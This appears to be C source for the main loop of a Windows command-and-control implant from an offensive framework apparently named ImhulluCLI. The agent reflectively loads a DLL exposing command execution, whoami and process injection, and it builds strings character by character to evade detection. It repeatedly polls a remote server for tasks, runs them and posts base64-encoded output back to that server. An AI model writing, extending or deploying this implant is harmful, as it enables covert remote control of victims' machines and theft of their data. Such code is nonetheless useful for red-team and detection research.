// TODO: Using custom implementations of functionalities such as trimming and parsing is not okay as they can easily be flagged

#include "../include/addresshunter.h"
#include "../include/http.h"
#include "../include/typedefs.h"
#include "../include/task.h"
#include "../include/json.h"
#include "../include/agent.h"
#include <time.h>

// will be overwritten by ImhulluCLI
// ImhulluCLI defines these macros when it compiles the agent
// these are here just so IDEs don't complain.
#ifndef SERVER_M
#define SERVER_M '1','9','2','.','1','6','8','.','0','.','1',0
#endif
#ifndef PORT_M
#define PORT_M 5001
#endif
#ifndef UUID_M
#define UUID_M '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
#endif

void myMain()
{
    Agent _agent = {0};
    Agent* agent = &_agent;

    WCHAR wRemoteServer[] = { SERVER_M };
    DWORD dwRemoteServerLength = myStrlenW(wRemoteServer)+1;
    INTERNET_PORT dwRemotePort = PORT_M;

    if (AgentPopulate(agent, wRemoteServer, dwRemoteServerLength, dwRemotePort, 3000) == FALSE)
    {
        DEBUG_PRINTF_ERROR("%s", "myMain: AgentPopulate failed\n");
    }

    // TODO: Implement IoC by using function callbacks as parameters so that the only function that I need to run is loadReflectiveDll to load any DLL I want
    DLL esgStdDll = AGENT_loadReflectiveDll(agent);
    PDLL pEsgStdDll = &esgStdDll;

    CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
    CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
    CHAR injectIntoProcess_c[] = { 'i', 'n', 'j', 'e', 'c', 't', 'I', 'n', 't', 'o', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };

    ESG_STD_API EsgStdApi = { 0 };
    PESG_STD_API PEsgStdApi = &EsgStdApi;

    PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, runCmd_c);
    PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, whoami_c);
    PEsgStdApi->injectIntoProcess = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, injectIntoProcess_c);

    WCHAR pathTasks[] = { '/', 't', 'a', 's', 'k', 's', '/', UUID_M };

    CHAR* jsonResponse = NULL;
    CHAR* orgOutput = NULL;
    CHAR* taskOutput;
    CHAR* b64EncodedOutput;
    DWORD b64EncodedOutputSize;
    DWORD sizeOfOutput;
    // json for the response
    CHAR jsonFormat[] =
    {
    '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '"', '%', 's', '"', ',',
    ' ', '"', 'a', 'g', 'e', 'n', 't', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"',
    '%', 's', '"', ',', ' ', '"', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p',
    'u', 't', '"', ':', ' ', '"', '%', 's', '"', '}', 0
    };
    DWORD totalJsonSize;
    CHAR* json;
    WCHAR pathSendTaskOutput[] =
    {
        '/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u',
        't', '/', UUID_M
    };

    while (TRUE)
    {
        jsonResponse = GetRequest(&agent->api, agent->_remoteServer, agent->_remotePort, pathTasks);

        if (!jsonResponse)
        {
            ((SLEEP)agent->api.Sleep)(agent->_interval);
            continue;
        }

        // task is sent in base64 format to prevent corrupting json
        Task task = readJsonTask(&agent->api, jsonResponse);

        // if json is empty
        // readJsonTask returns a task struct with all fields equal to NULL
        if (task.taskId == NULL)
        {
            ((SLEEP)agent->api.Sleep)(agent->_interval);
            continue;
        }

        if (AgentExecuteTask(agent, PEsgStdApi, pEsgStdDll, task, &taskOutput, &sizeOfOutput) == FALSE)
        {
            DEBUG_PRINTF_WARNING("%s", "myMain: AgentExecuteTask failed, no task present or execution failed\n");
            ((SLEEP)agent->api.Sleep)(agent->_interval);
            continue;
        }

        // determine the size for base64 encoded output value
        ((CRYPTBINARYTOSTRINGA)agent->api.CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
        // allocate memory for the base64 encoded value
        b64EncodedOutput = (CHAR*)((CALLOC)agent->api.calloc)(b64EncodedOutputSize, sizeof(CHAR));
        // encode plain text output value
        ((CRYPTBINARYTOSTRINGA)agent->api.CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);

        // calculate the final json size
        totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(task.taskId) + myStrlenA(task.agentUuid);
        // allocate memory for the final json
        json = (CHAR*)((CALLOC)agent->api.calloc)(totalJsonSize, sizeof(CHAR));
        // fill the jsonFormat with relevant values
        ((SNPRINTF)agent->api.snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, b64EncodedOutput);
        PostRequest(&agent->api, agent->_remoteServer, agent->_remotePort, pathSendTaskOutput, json);

        ((FREE)agent->api.free)(taskOutput);
        taskOutput = NULL;
        ((FREE)agent->api.free)(task.taskId);
        task.taskId = NULL;
        ((FREE)agent->api.free)(task.taskParams);
        task.taskParams = NULL;
        ((FREE)agent->api.free)(task.taskType);
        task.taskType = NULL;
        ((FREE)agent->api.free)(task.agentUuid);
        task.taskType = NULL;
        ((FREE)agent->api.free)(orgOutput);
        orgOutput = NULL;
        ((FREE)agent->api.free)(b64EncodedOutput);
        b64EncodedOutput = NULL;
        ((FREE)agent->api.free)(jsonResponse);
        jsonResponse = NULL;
        ((FREE)agent->api.free)(json);
        json = NULL;

        ((SLEEP)agent->api.Sleep)(3000);
    }
    ((FREE)agent->api.free)(pEsgStdDll->pBuffer);
    pEsgStdDll->pBuffer = NULL;
}

